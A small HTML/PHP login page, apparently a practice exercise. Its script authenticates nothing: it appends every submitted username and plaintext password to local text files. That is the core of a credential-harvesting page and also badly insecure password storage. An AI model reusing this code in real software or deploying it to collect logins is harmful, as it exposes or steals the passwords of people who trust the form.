<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>login</title>
  <link rel="stylesheet" href="index.css">
</head>
<body>
<?php

if(isset($_POST['UserName'])) {

  $name = $_POST['UserName'];
  $password = $_POST['Password'];

  $handle = fopen('names.txt', 'a');
  $passkey = fopen('pass.txt', 'a');

  fwrite($handle, $name."\n");

  fwrite($passkey, $password."\n");

  fclose($handle); 
  fclose($passkey);

}

?>

<div class="login">
        <div class="inner">
            <form action="practice.php" method="post">
            <div class="Name">
                <label>UserName:</label><br>
                <input type="text" , name="UserName" id="Input" required><br>
            </div>
            <div class="pass">
                <label>Password:</label> <br>
                <input type="password" name="Password" id="mypassword" required>
                <input type="submit" id="Mybutton" name="submit" value="Submit">
            </div>
        </form>
        </div>
    </div>
</body>
</html>

